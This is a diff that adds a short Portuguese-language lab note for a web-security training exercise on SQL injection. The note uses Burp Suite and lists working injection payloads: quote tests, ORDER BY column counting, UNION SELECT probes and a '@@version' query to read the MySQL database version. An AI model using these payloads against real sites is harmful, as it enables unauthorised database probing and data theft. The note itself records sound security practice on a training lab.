@@ -1,0 +1,24 @@
+\\SQL injection attack, querying the database type and version on MySQL and Microsoft//
+--------------------------------------------------------------------------------------
+
+Laboratório: https://ac001f901f0614ffc0c007cd0038006a.web-security-academy.net/
+
+
+Vamos utiliar o burpsuite para interceptar a requisição.
+
+Testar aspas simples:
+'
+'-- 
+'#
+'ORDER BY 2--  |-> Retorna erro 500
+'ORDER BY 2#   |-> Não retorna erro
+
+Resposta:
+GET /filter?category=%27ORDER%20BY%202#
+
+'UNION SELECT NULL, NULL#
+'UNION SELECT 1, 2#
+'UNION SELECT 'a','b'#
+
+Pegando versão do banco de dados.
+'UNION SELECT 1,@@version#
